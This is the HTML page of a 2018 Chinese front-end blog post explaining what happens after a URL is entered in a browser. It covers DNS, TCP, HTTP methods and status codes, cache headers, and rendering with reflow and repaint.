@@ -1,0 +1,780 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 6.1.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="本片以浏览器输入url后页面的加载过程讲起，引导出js单线程、性能优化、web安全等方面的问题，进一步延展出后边几篇对html、css、js、前端算法等相关知识梳理的文章">
+<meta property="og:type" content="article">
+<meta property="og:title" content="前端知识体系梳理（一）—— 从浏览器输入网址说起">
+<meta property="og:url" content="http://example.com/2018/03/13/%E5%89%8D%E7%AB%AF%E7%9F%A5%E8%AF%86%E4%BD%93%E7%B3%BB%E6%A2%B3%E7%90%86%EF%BC%88%E4%B8%80%EF%BC%89%E2%80%94%E2%80%94-%E4%BB%8E%E6%B5%8F%E8%A7%88%E5%99%A8%E8%BE%93%E5%85%A5%E7%BD%91%E5%9D%80%E5%BC%80%E5%A7%8B/index.html">
+<meta property="og:site_name" content="路漫漫其修远兮&lt;br &#x2F;&gt;吾将上下而求索">
+<meta property="og:description" content="本片以浏览器输入url后页面的加载过程讲起，引导出js单线程、性能优化、web安全等方面的问题，进一步延展出后边几篇对html、css、js、前端算法等相关知识梳理的文章">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2018-03-13T04:27:46.000Z">
+<meta property="article:modified_time" content="2018-03-31T00:43:51.000Z">
+<meta property="article:author" content="taoyingsong">
+<meta property="article:tag" content="浏览器url js单线程 web安全 缓存">
+<meta name="twitter:card" content="summary">
+
+<link rel="canonical" href="http://example.com/2018/03/13/%E5%89%8D%E7%AB%AF%E7%9F%A5%E8%AF%86%E4%BD%93%E7%B3%BB%E6%A2%B3%E7%90%86%EF%BC%88%E4%B8%80%EF%BC%89%E2%80%94%E2%80%94-%E4%BB%8E%E6%B5%8F%E8%A7%88%E5%99%A8%E8%BE%93%E5%85%A5%E7%BD%91%E5%9D%80%E5%BC%80%E5%A7%8B/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>前端知识体系梳理（一）—— 从浏览器输入网址说起 | 路漫漫其修远兮<br />吾将上下而求索</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">路漫漫其修远兮<br />吾将上下而求索</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2018/03/13/%E5%89%8D%E7%AB%AF%E7%9F%A5%E8%AF%86%E4%BD%93%E7%B3%BB%E6%A2%B3%E7%90%86%EF%BC%88%E4%B8%80%EF%BC%89%E2%80%94%E2%80%94-%E4%BB%8E%E6%B5%8F%E8%A7%88%E5%99%A8%E8%BE%93%E5%85%A5%E7%BD%91%E5%9D%80%E5%BC%80%E5%A7%8B/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="taoyingsong">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="路漫漫其修远兮<br />吾将上下而求索">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          前端知识体系梳理（一）—— 从浏览器输入网址说起
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2018-03-13 12:27:46" itemprop="dateCreated datePublished" datetime="2018-03-13T12:27:46+08:00">2018-03-13</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2018-03-31 08:43:51" itemprop="dateModified" datetime="2018-03-31T08:43:51+08:00">2018-03-31</time>
+              </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>本片以浏览器输入url后页面的加载过程讲起，引导出js单线程、性能优化、web安全等方面的问题，进一步延展出后边几篇对html、css、js、前端算法等相关知识梳理的文章</p>
+<span id="more"></span>
+<p>提纲</p>
+<ul>
+<li>浏览器输入url按回车后发生了什么<ul>
+<li>DNS域名解析获取IP</li>
+<li>建立TCP连接</li>
+<li>发起HTTP请求</li>
+<li>接受响应结果<ul>
+<li>扩展出缓存相关问题  <ul>
+<li>相关头部字段</li>
+<li>用户浏览器刷新访问行为</li>
+<li>总结</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>浏览器解析html、布局、渲染<ul>
+<li>扩展出js单线程问题<ul>
+<li>js单线程执行栈、任务队列模型</li>
+<li>浏览器多线程</li>
+<li>setInterval setTimeout</li>
+<li>非阻塞js实现</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>前端优化综述<ul>
+<li>about优化</li>
+<li>优化详情</li>
+</ul>
+</li>
+<li>web安全<ul>
+<li>XSS</li>
+<li>CSRF</li>
+</ul>
+</li>
+</ul>
+<hr>
+<h1 id="浏览器输入url按回车后发生了什么"><a href="#浏览器输入url按回车后发生了什么" class="headerlink" title="浏览器输入url按回车后发生了什么"></a>浏览器输入url按回车后发生了什么</h1><h2 id="DNS域名解析获取IP"><a href="#DNS域名解析获取IP" class="headerlink" title="DNS域名解析获取IP"></a>DNS域名解析获取IP</h2><h4 id="解析路线"><a href="#解析路线" class="headerlink" title="解析路线"></a>解析路线</h4><p>浏览器DNS缓存 -&gt; 操作系统DNS缓存 -&gt;【<strong>系统hosts文件</strong>】 -&gt; 【<strong>本地配置的首选DNS服务器（本地DNS服务器）</strong>】 -&gt; 【<strong>根DNS服务器</strong>】 -&gt; 【**域DNS服务器(依次经过顶级域、二级域等)**】-&gt; 本地DNS服务器缓存结果并返回</p>
+<blockquote>
+<p>ps.【】—— 为主干路线。DNS存在着多级缓存，从离浏览器的距离排序的话，有以下几种: 浏览器缓存，系统缓存，路由器缓存，IPS服务器缓存，根域名服务器缓存，顶级域名服务器缓存，主域名服务器缓存，太过详细的上边就没写了。</p>
+</blockquote>
+<p>demo:<br>浏览器中输入<a href="http://www.google.com后：">www.google.com后：</a><br>网址的解析是一个从右向左的过程: com -&gt; google.com -&gt; <a target="_blank" rel="noopener" href="http://www.google.com/">www.google.com</a> 。但是你是否发现少了点什么，根域名服务器的解析过程呢？事实上，真正的网址是<a target="_blank" rel="noopener" href="http://www.google.com/">www.google.com</a>. ，并不是我多打了一个.，这个.对应的就是根域名服务器，默认情况下所有的网址的最后一位都是.，既然是默认情况下，为了方便用户，通常都会省略，浏览器在请求DNS的时候会自动加上，所有网址真正的解析过程为: . -&gt; .com -&gt; google.com. -&gt; <a target="_blank" rel="noopener" href="http://www.google.com../">www.google.com.。</a></p>
+<h4 id="优化"><a href="#优化" class="headerlink" title="优化"></a>优化</h4><p>了解了DNS的过程，可以为我们带来哪些？上文中请求到google的IP地址时，经历了8个步骤，这个过程中存在多个请求，如果每次都经过这么多步骤，是否太耗时间？如何减少该过程的步骤呢？那就是DNS缓存。<br>DNS优化主要一下2点：</p>
+<ol>
+<li>减少DNS请求<br> 合理利用缓存，减少文件请求</li>
+<li>DNS预解析<br> 可以通过用meta信息来告知浏览器, 我这页面要做DNS预解析<br> <code>&lt;meta http-equiv=&quot;x-dns-prefetch-control&quot; content=&quot;on&quot; /&gt;</code>可以使用link标签来强制对DNS做预解析:<br> <code>&lt;link rel=&quot;dns-prefetch&quot; href=&quot;http://campus.lagou.com/&quot; /&gt;</code></li>
+</ol>
+<h4 id="扩展"><a href="#扩展" class="headerlink" title="扩展"></a>扩展</h4><p><strong>DNS负载均衡：</strong><br>DNS可以返回一个合适的机器的IP给用户，例如可以根据每台机器的负载量，该机器离用户地理位置的距离等等，这种过程就是DNS负载均衡，又叫做DNS重定向</p>
+<p><strong>CDN加速：</strong><br>CDN 就利用了DNS负载均衡的技术，另外还会提供专业的加载优化方案，所以静态资源要尽量放在 CDN 上。</p>
+<h2 id="建立TCP连接"><a href="#建立TCP连接" class="headerlink" title="建立TCP连接"></a>建立TCP连接</h2><p>主要是三次握手、四次挥手<br>（没事可以回顾一下为什么要三次握手，2次不行嘛，4次呢。为什么要四次挥手）</p>
+<h4 id="优化-1"><a href="#优化-1" class="headerlink" title="优化"></a>优化</h4><p>HTTP协议是使用TCP作为其传输层协议的，当TCP出现瓶颈时，HTTP也会受到影响。但是这部分前端能做的有限不做展开。</p>
+<h4 id="扩展-1"><a href="#扩展-1" class="headerlink" title="扩展"></a>扩展</h4><p><strong>TCP、UDP区别:</strong><br>TCP面向连接的协议、传输可靠、速度慢。<br>UPD无连接的传输层协议、传输不可靠、速度快。（音频、视频会用）</p>
+<p><strong>HTTPS协议：</strong><br>HTTP报文是明文，如果中间被截取的话会存在一些信息泄露的风险，那么在进入TCP报文之前对HTTP做一次加密就可以解决这个问题了。使用对称密钥加密内容，使用非对称密钥加密对称密钥。</p>
+<p>HTTPS和HTTP的区别主要如下：安全不安全，加密不加密，TCP端口<br>1、https协议需要到ca（认证中心）申请证书，一般免费证书较少，因而需要一定费用。<br>2、http是超文本传输协议，信息是明文传输，https则是具有安全性的ssl加密传输协议。<br>3、http和https使用的是完全不同的连接方式，用的端口也不一样，前者TCP port是80，后者是443。<br>4、http的连接很简单，是无状态的；HTTPS协议是由SSL+HTTP协议构建的可进行加密传输、身份认证的网络协议，比http协议安全。</p>
+<p><strong>网络七层协议：</strong><br>OSI模型从上而下：Application(应用层)、Presentation(表示层)、Session(会话层)、Transport(传输层)、Network(网络层)、Data Link(数据链路层)、Physical(物理层)<br>以前是这么记的：All people seem to need data processing</p>
+<h2 id="发起HTTP请求"><a href="#发起HTTP请求" class="headerlink" title="发起HTTP请求"></a>发起HTTP请求</h2><p>HTTP请求报文是由三部分组成: 【<strong>请求行</strong>】, 【<strong>请求报头</strong>】和【<strong>请求正文</strong>】。</p>
+<p>首部字段大概介绍：<br>Accept：用于指定客户端用于接受哪些类型的信息<br>Accept-Encoding：与Accept类似，它用于指定接受的编码方式<br>Connection：可设置为Keep-alive，服务端和客户端都可以使用它告诉对方在发送完数据之后不需要断开 TCP 连接，这样可以使下次HTTP请求使用相同的TCP通道，节省TCP连接建立的时间，这就是建立长连接。<br>Content-Type：与请求正文相关的信息。如请求json格式的数据设置application&#x2F;json<br>Cookie: 请求时携带的cookie信息<br>Referer: 请求来源<br>User-Agent: 用户代理 </p>
+<p>请求方法大概介绍：<br>GET：获取（查）<br>POST：向服务器端发送（改）<br>PUT：是向服务器端新增（增）<br>DELETE：在服务器端删除（删）</p>
+<h4 id="扩展-2"><a href="#扩展-2" class="headerlink" title="扩展"></a>扩展</h4><p><strong>get,post区别：</strong></p>
+<ol>
+<li>最直观的就是语义上的区别，get用于获取数据，post用于提交数据。</li>
+<li>get有利于传播，post有利于隐藏请求数据</li>
+<li>get参数有长度限制（受限于url长度，具体的数值取决于浏览器和服务器的限制），而post无限制</li>
+</ol>
+<p>详细说下第一点，先说结论：颠倒两者会造成非常糟糕的结果。</p>
+<p>比如一个网页地址是：<a target="_blank" rel="noopener" href="http://www.taobao.com/?itemId=123">http://www.taobao.com?itemId=123</a><br>你把它发给朋友，说这个东西很酷！这就是用get来获取数据最正确的方式，它有利于传播。<br>但如果你用post请求获取到一个商品页面，url还是<a target="_blank" rel="noopener" href="http://www.taobao.com/">http://www.taobao.com</a> 那你把这个url分享给朋友是没有意义的。</p>
+<p>反过来，如果你用<a target="_blank" rel="noopener" href="http://www.weibo.com/?uid=1&amp;content=haha&amp;token=xxxxxxxxxx">http://www.weibo.com?uid=1&amp;content=haha&amp;token=xxxxxxxxxx</a><br>来发一条内容为haha的微博，并且这个url被其他人看到了。<br>那他直接把url在他那儿复制一下就可以帮你发微博了，是不是也很不合理？这里使用post有利于隐藏信息</p>
+<p><strong>服务器通常是如何处理我们的请求的呢：</strong><br>通常客户端不是直接通过HTTP协议访问某网站应用服务器，而是先请求到Nginx，Nginx再请求应用服务器，然后将结果返回给客户端，这里Nginx的作用是反向代理服务器。同时也带来了一个好处，其中一台服务器万一挂了，只要还有其他服务器正常运行，就不会影响用户使用</p>
+<h2 id="接受响应结果"><a href="#接受响应结果" class="headerlink" title="接受响应结果"></a>接受响应结果</h2><p>HTTP响应报文也是由三部分组成: 【<strong>响应行</strong>】, 【<strong>响应报头</strong>】和【<strong>响应报文</strong>】。</p>
+<p>响应状态码：</p>
+<ul>
+<li>1xx：信息性状态码，表示服务器已接收了客户端请求，客户端可继续发送请求。<ul>
+<li>100 Continue</li>
+<li>101 Switching Protocols</li>
+</ul>
+</li>
+<li>2xx：成功状态码，表示服务器已成功接收到请求并进行处理。200 OK 表示客户端请求成功<ul>
+<li>204 No Content 成功，但不返回任何实体的主体部分</li>
+<li>206 Partial Content 成功执行了一个范围（Range）请求</li>
+</ul>
+</li>
+<li>3xx：重定向状态码，表示服务器要求客户端重定向。<ul>
+<li>301 Moved Permanently 永久性重定向，响应报文的Location首部应该有该资源的新URL</li>
+<li>302 Found 临时性重定向，响应报文的Location首部给出的URL用来临时定位资源</li>
+<li>303 See Other 请求的资源存在着另一个URI，客户端应使用GET方法定向获取请求的资源</li>
+<li>304 Not Modified 服务器内容没有更新，可以直接读取浏览器缓存</li>
+<li>307 Temporary Redirect 临时重定向。与302 Found含义一样。302禁止POST变换为GET，但实际使用时并不一定，307则更多浏览器可能会遵循这一标准，但也依赖于浏览器具体实现</li>
+</ul>
+</li>
+<li>4xx：客户端错误状态码，表示客户端的请求有非法内容。<ul>
+<li>400 Bad Request 表示客户端请求有语法错误，不能被服务器所理解</li>
+<li>401 Unauthonzed 表示请求未经授权，该状态代码必须与 WWW-Authenticate 报头域一起使用</li>
+<li>403 Forbidden 表示服务器收到请求，但是拒绝提供服务，通常会在响应正文中给出不提供服务的原因</li>
+<li>404 Not Found 请求的资源不存在，例如，输入了错误的URL</li>
+</ul>
+</li>
+<li>5xx：服务器错误状态码，表示服务器未能正常处理客户端的请求而出现意外错误。<ul>
+<li>500 Internel Server Error 表示服务器发生不可预期的错误，导致无法完成客户端的请求</li>
+<li>501 Not Implemented(未实现)比如，使用了服务器不支持的请求方法</li>
+<li>502 Bad Gateway（网关故障）代理使用的服务器遇到了上游的无效响应。如我们不翻墙访问<a target="_blank" rel="noopener" href="http://www.facebook.com/">www.facebook.com</a></li>
+<li>503 Service Unavailable 表示服务器当前不能够处理客户端的请求，在一段时间之后，服务器可能会恢复正常</li>
+</ul>
+</li>
+</ul>
+<p><strong>扩展：</strong><br>301和302的区别：<br>共同点：</p>
+<ul>
+<li>301和302状态码都表示重定向，就是说浏览器在拿到服务器返回的这个状态码后会自动跳转到一个新的URL地址，这个地址可以从响应的Location首部中获取（用户看到的效果就是他输入的地址A瞬间变成了另一个地址B）</li>
+</ul>
+<p>不同点：</p>
+<ul>
+<li>301表示旧地址A的资源已经被永久地移除了（这个资源不可访问了），搜索引擎在抓取新内容的同时也将旧的网址交换为重定向之后的网址；</li>
+<li>302表示旧地址A的资源还在（仍然可以访问），这个重定向只是临时地从旧地址A跳转到地址B，搜索引擎会抓取新的内容而保存旧的网址。 SEO302好于301</li>
+</ul>
+<p>重定向的原因：</p>
+<ol>
+<li>网站调整（如改变网页目录结构）；</li>
+<li>网页被移到一个新地址；</li>
+<li>网页扩展名改变(如应用需要把.php改成.Html或.shtml)。</li>
+<li>注册了多个域名的网站往往也需要重定向到主站点</li>
+</ol>
+<p>重定向的好处：</p>
+<ol>
+<li>其中一个跟搜索引擎排名有关。如果一个页面有两个地址，就像<a target="_blank" rel="noopener" href="http://www.google.com/%E5%92%8Chttp://google.com/%EF%BC%8C%E6%90%9C%E7%B4%A2%E5%BC%95%E6%93%8E%E4%BC%9A%E8%AE%A4%E4%B8%BA%E5%AE%83%E4%BB%AC%E6%98%AF%E4%B8%A4%E4%B8%AA%E7%BD%91%E7%AB%99%EF%BC%8C%E7%BB%93%E6%9E%9C%E9%80%A0%E6%88%90%E6%AF%8F%E4%B8%AA%E6%90%9C%E7%B4%A2%E9%93%BE%E6%8E%A5%E9%83%BD%E5%87%8F%E5%B0%91%E4%BB%8E%E8%80%8C%E9%99%8D%E4%BD%8E%E6%8E%92%E5%90%8D%E3%80%82%E8%80%8C%E6%90%9C%E7%B4%A2%E5%BC%95%E6%93%8E%E7%9F%A5%E9%81%93301%E6%B0%B8%E4%B9%85%E9%87%8D%E5%AE%9A%E5%90%91%E6%98%AF%E4%BB%80%E4%B9%88%E6%84%8F%E6%80%9D%EF%BC%8C%E8%BF%99%E6%A0%B7%E5%B0%B1%E4%BC%9A%E6%8A%8A%E8%AE%BF%E9%97%AE%E5%B8%A6www%E7%9A%84%E5%92%8C%E4%B8%8D%E5%B8%A6www%E7%9A%84%E5%9C%B0%E5%9D%80%E5%BD%92%E5%88%B0%E5%90%8C%E4%B8%80%E4%B8%AA%E7%BD%91%E7%AB%99%E6%8E%92%E5%90%8D%E4%B8%8B%E3%80%82">http://www.google.com/和http://google.com/，搜索引擎会认为它们是两个网站，结果造成每个搜索链接都减少从而降低排名。而搜索引擎知道301永久重定向是什么意思，这样就会把访问带www的和不带www的地址归到同一个网站排名下。</a></li>
+<li>还有就是缓存友好，用不同的地址会造成缓存友好性变差，当一个页面有好几个名字时，它可能会在缓存里出现好几次。</li>
+</ol>
+<p>什么时候进行301或者302跳转呢：<br>当一个网站或者网页24—48小时内临时移动到一个新的位置，这时候就要进行302跳转，而使用301跳转的场景就是之前的网站因为某种原因需要移除掉，然后要到新的地址访问，是永久性的。301跳转的大概场景如下：</p>
+<ol>
+<li>域名到期不想续费（或者发现了更适合网站的域名），想换个域名。</li>
+<li>在搜索引擎的搜索结果中出现了不带www的域名，而带www的域名却没有收录，这个时候可以用301重定向来告诉搜索引擎我们目标的域名是哪一个。</li>
+<li>空间服务器不稳定，换空间的时候。</li>
+</ol>
+<h3 id="扩展出缓存相关问题"><a href="#扩展出缓存相关问题" class="headerlink" title="扩展出缓存相关问题"></a>扩展出缓存相关问题</h3><blockquote>
+<p><strong>问题</strong>：请求资源时是否不用发起请求读取本地缓存即可 —— 控制的头有哪些；若发起请求是否一定要返回实体 —— 控制的头有哪些；用户刷新访问行为。<br> （这部分主要结合着http首部字段想明白上边问题，更详细的东西就不放出来了）</p>
+</blockquote>
+<p><strong>头部字段</strong>：</p>
+<ul>
+<li><strong>Pragma</strong>：http1.0产物，值为“no-cache”时禁用缓存</li>
+<li><strong>Expires</strong>：控制缓存相对服务器失效的时间点</li>
+<li><strong>Cache-Control</strong>: 控制缓存相对本地时间多久失效，可设置时间长度（弥补Expires不足）</li>
+</ul>
+<p>同时出现的优先级： Pragma -&gt; Cache-Control -&gt; Expires</p>
+<ul>
+<li><strong>Last-Modified</strong>: 资源最后修改时间</li>
+<li><strong>Etag</strong>: 资源唯一标志符（弥补last-modified不足）</li>
+<li><strong>If-Modified-Since</strong>: Last-Modified-value<br>示例： If-Modified-Since: Thu, 31 Mar 2016 07:07:52 GMT<br>该请求首部告诉服务器如果客户端传来的这个最后修改时间与服务器上的一致，则直接回送304 和响应报头即可。</li>
+<li><strong>If-None-Match</strong>: ETag-value<br> 示例： If-None-Match: “5d8c72a5edda8d6a:3239”<br>告诉服务端如果 ETag 没匹配上需要重发资源数据，否则直接回送304 和响应报头即可。</li>
+</ul>
+<p><strong>综述</strong>：</p>
+<ol>
+<li>200: 当【浏览器本地没有缓存】 或 【请求内容数据发生变更】 或 【用户使用CTL+F5强制刷新】时，浏览器直接取服务器下载最新数据。</li>
+<li>304: 由last-modified&#x2F;etag 控制。当【缓存失效】 或 【用户点击refresh、h5等刷新】时 浏览器就会发送请求给服务器，如果服务器端资源没有变化，则返回304给浏览器。</li>
+<li>200（from cache）: 由expires&#x2F;cache-control控制。1、expires(http1.0版有效)是绝对的时间点。2、cache-control(http 1.1 版有效)，相对的时间长度，两者都存在时cache-control覆盖expires只要没有失效，浏览器只访问自己的缓存。</li>
+</ol>
+<p><strong>总结</strong>：</p>
+<ul>
+<li>Last-Modified和Etag每次请求资源时都会携带相关头，哪怕是很久都不会有修改的资源，都至少有一次请求响应的消耗。<br /><br /> 对于所有可缓存资源，指定一个Expires或Cache-Control max-age以及一个Last-Modified或ETag至关重要。同时使用前者和后者可以很好的相互适应。<br /><br /> Expires或Cache-Control max-age不需要每次都发起一次请求来校验资源时效性，Last-Modified或ETag保证当资源未出现修改的时候不需要重新发送该资源。而在用户的不同刷新页面行为中，二者的结合也能很好的利用HTTP缓存控制特性，无论是在地址栏输入URI然后输入回车进行访问，还是点击刷新按钮，浏览器都能充分利用缓存内容，避免进行不必要的请求与数据传输。<br/><br/></li>
+<li>需要兼容HTTP1.0的时候需要使用Expires，不然可以考虑直接使用Cache-Control</li>
+<li>需要处理一秒内多次修改的情况，或者其他Last-Modified处理不了的情况，才使用ETag，否则使用Last-Modified。</li>
+<li>对于所有可缓存资源，需要指定一个Expires或Cache-Control，同时指定Last-Modified或者Etag。</li>
+<li>可以通过标识文件版本名、加长缓存时间的方式来减少304响应。</li>
+</ul>
+<p><strong>扩展</strong><br>HTTP&#x2F;1.1相较于 HTTP&#x2F;1.0 协议的区别主要体现在：<br>1 缓存处理<br>2 带宽优化及网络连接的使用(HTTP1.1中默认开启Connection： keep-alive)<br>3 错误通知的管理<br>4 消息在网络中的发送<br>5 互联网地址的维护<br>6 安全性及完整性<br>更多内容可以参考下这里：<a target="_blank" rel="noopener" href="https://juejin.im/entry/5981c5df518825359a2b9476">https://juejin.im/entry/5981c5df518825359a2b9476</a></p>
+<h2 id="浏览器解析html、布局、渲染"><a href="#浏览器解析html、布局、渲染" class="headerlink" title="浏览器解析html、布局、渲染"></a>浏览器解析html、布局、渲染</h2><p>【一、一个网页的加载依赖于脚本文件、CSS样式文件等。让我们看看浏览器加载网页的过程】：</p>
+<ol>
+<li>首先，浏览器下载 HTML 并开始解析。如果浏览器发现外部CSS资源链接则发送下载请求。‘</li>
+<li>浏览器可以在下载CSS资源的同时，并行解析HTML文件，但是，一旦发现有脚本文件的引用，则必须等待脚本文件完成下载并且执行后才能继续解析。 <br/>（即使浏览器可以并行执行多个请求，因为JS有可能会修改DOM，最为经典的document.write，这意味着，在JS执行完成前，后续所有资源的下载可能是没有必要的，这是js阻塞后续资源下载的根本原因。<em><strong>因为js是阻塞的，所以平时书写会将 JS 放在 HTML 底部，以保证让浏览器优先渲染完现有的 HTML 内容，让用户先看到内容，体验好。另外，JS 执行如果涉及 DOM 操作，得等待 DOM 解析完成才行，JS 放在底部执行时，HTML 肯定都解析成了 DOM 结构。JS 如果放在 HTML 顶部，JS 执行的时候 HTML 还没来得及转换为 DOM 结构，可能会报错。</strong></em>）</li>
+<li>脚本文件完成下载并且执行后，浏览器可以继续解析HTML工作，如果遇到非阻塞资源 eg. 图片浏览器会发送下载请求并且继续解析。</li>
+</ol>
+<p>【二、浏览器是如何把页面呈现在屏幕上的呢？<br>不同浏览器可能解析的过程不太一样，以WebKit的渲染过程为例，这个过程包括】：<br><strong>解析html以构建dom树 &amp;&amp; 解析css构建css规则树 -&gt; 构建render树 -&gt; 布局render树 -&gt; 绘制render树</strong></p>
+<blockquote>
+<p>值得注意的是，浏览器没有完整解析全部HTML文档时，它就已经开始显示这个页面了。就是说这个过程是逐步完成的，为了更好的用户体验，渲染引擎将会尽可能早的将内容呈现到屏幕上，并不会等到所有的html都解析完成之后再去构建和布局render树。（<em><strong>问题：为何要将 CSS 放在 HTML 头部？—— 这样会让浏览器尽早拿到 CSS 尽早生成 CSSOM，尽快渲染</strong></em>），<br/>浏览器是解析完一部分内容就显示一部分内容，在解析过程中，如果遇到请求外部资源时，如图片、外链的CSS、iconfont等，请求过程是异步的，解析器会在下载的同时继续解析后面的html来构建DOM树（css的下载ie不会阻塞，ff还会阻塞），而在下载js文件和执行它时，解析器会停止对html的解析。这便出现了js阻塞问题（——后文还会讲到）。<br>其中渲染树与DOM树不同，渲染树中并没有head、display为none等不必显示的节点。</p>
+</blockquote>
+<p>【三、页面布局渲染】：<br>等到渲染树构建完成后，浏览器开始布局渲染树并将其绘制到屏幕上。这个过程比较复杂，涉及到两个概念: reflow(回流)和repain(重绘)。</p>
+<ol>
+<li>reflow(回流)：&amp;emsp;DOM节点中的各个元素都是以【盒模型】的形式存在，这些都需要浏览器去计算其位置和大小等，这个过程称为relow。</li>
+<li>repain(重绘)：&amp;emsp;当盒模型的位置,大小以及其他属性，如颜色,字体,等确定下来之后，浏览器便开始绘制内容，如给布局上色，这个过程称为repain。</li>
+<li>页面在首次加载时必然会经历reflow和repain。reflow和repain过程是非常消耗性能的，尤其是在移动设备上，它会破坏用户体验，有时会造成页面卡顿。所以我们应该尽可能少的减少reflow和repain。</li>
+</ol>
+<h4 id="优化-2"><a href="#优化-2" class="headerlink" title="优化"></a>优化</h4><p>在页面显示的过程中会多次进行Reflow和Repaint操作，而Reflow的成本比Repaint的成本高得多的多。因为Repaint只是将某个部分进行重新绘制而不用改变页面的布局，如：改变了某个元素的背景颜色。而如果将元素的display属性由block改为none则需要Reflow。</p>
+<p>如何减少Reflow &amp; Repaint：</p>
+<ul>
+<li>不要一条一条的修改DOM的样式</li>
+<li>把DOM离线后修改<ul>
+<li>使用documentFragment对象在内存里操作DOM</li>
+<li>先把DOM给display: none;</li>
+<li>clone 一个DOM节点到内存里进行操作</li>
+</ul>
+</li>
+<li>为动画的HTML元素使用fixed或absolute的position</li>
+</ul>
+<h4 id="扩展-3"><a href="#扩展-3" class="headerlink" title="扩展"></a>扩展</h4><p>预加载器：<br>当浏览器被脚本文件阻塞时，预加载器（一个轻量级的解析器）会继续解析后面的html，寻找需要下载的资源。如果发现有需要下载的资源，预加载器在开始接收这些资源。预加载器只能检索HTML标签中的URL，无法检测到使用脚本添加的URL，这些资源要等脚本代码执行时才会获取。<br>注: 预解析并不改变Dom树，它将这个工作留给主解析过程</p>
